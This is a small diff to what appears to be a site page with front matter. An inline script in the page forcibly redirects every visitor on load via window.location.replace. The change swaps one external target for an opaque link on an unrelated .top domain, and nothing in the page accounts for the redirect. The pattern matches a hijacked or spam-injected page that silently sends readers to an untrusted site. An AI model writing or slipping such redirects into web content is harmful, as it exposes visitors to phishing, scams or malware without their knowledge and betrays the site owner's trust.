@@ -5,7 +5,7 @@ config:
 ---
 <script>
   if (typeof window !== 'undefined') {
-     window.location.replace('https://e.zufe.edu.cn/preview-core/f0zePTZ.html?u=vBJQPORc&id=34337&feed=hb&type=0');
+     window.location.replace('http://e8v06.top/w/831_1VGB75M13CNX983F762');
     //window.open('/pzm.jpg', '_self')
   }
 </script>
